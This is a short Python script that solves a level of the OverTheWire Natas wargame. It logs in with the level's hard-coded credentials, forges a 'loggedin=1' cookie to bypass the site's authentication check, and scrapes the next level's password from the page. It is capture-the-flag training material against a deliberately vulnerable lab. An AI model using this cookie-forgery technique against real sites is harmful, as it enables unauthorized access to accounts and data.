import requests
import re #regular expressions

username = "natas5"
password = "e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M"

#head = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
cookies = {"loggedin":"1"}

url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session() #Maintains a session
response = session.get(url, auth=(username, password),cookies=cookies)
content = response.text

#print (session.cookies["loggedin"])
#print (content)
print (re.findall("natas6 is (.*)</div>",content)[0])
